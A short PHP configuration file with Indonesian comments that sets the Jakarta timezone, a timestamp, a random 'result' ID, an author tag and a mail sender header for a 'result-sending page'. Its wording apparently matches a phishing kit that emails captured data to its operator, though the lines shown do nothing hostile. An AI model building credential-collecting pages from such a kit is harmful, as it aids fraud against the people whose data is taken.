<?php
//KONTROL UNTUK MENDAPATKAN ZONA WAKTU (WILAYAH JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

//KONTROL AGAR RESULT TIDAK MENUMPUK
$result_id = rand(0,1000);

//KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'ITS ME ARPANTEK';
$sender = 'From: arpantek <result@arpantek.com>';
?>